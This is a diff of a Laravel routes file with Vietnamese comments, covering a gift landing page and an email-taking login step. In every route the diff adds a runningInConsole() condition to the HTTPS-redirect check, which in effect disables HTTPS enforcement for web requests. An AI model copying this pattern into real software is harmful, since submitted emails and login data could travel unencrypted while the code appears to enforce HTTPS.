@@ -6,28 +6,23 @@ use App\Models\User;
 
 // Trang chính truy cập '/'
 Route::get('/', function () {
-    if (!app()->environment('local') && !\Request::secure()) {
+    if (!app()->environment('local') && !\Request::secure() && app()->runningInConsole()) {
         return redirect()->secure(\Request::path());
     }
     return view('getItNow');
 });
 
-//Route::get('/', function () {
-//    return '🎉 Laravel hoạt động rồi!';
-//});
-
 // Khi bấm nút "Nhận ngay", chuyển đến welcome
 Route::get('/welcome', function () {
-    if (!app()->environment('local') && !\Request::secure()) {
+    if (!app()->environment('local') && !\Request::secure() && app()->runningInConsole()) {
         return redirect()->secure(\Request::path());
     }
     return view('welcome');
 });
 
-
 // ✅ SỬA LẠI route này để kiểm tra admin tại đây
 Route::post('/receive', function () {
-    if (!app()->environment('local') && !\Request::secure()) {
+    if (!app()->environment('local') && !\Request::secure() && app()->runningInConsole()) {
         return redirect()->secure(\Request::path());
     }
     $email = request('email');
@@ -52,7 +47,7 @@ Route::post('/receive', function () {
 })->name('login.step1');
 
 Route::get('/nhanQua', function () {
-    if (!app()->environment('local') && !\Request::secure()) {
+    if (!app()->environment('local') && !\Request::secure() && app()->runningInConsole()) {
         return redirect()->secure(\Request::path());
     }
     return view('receiveGift');
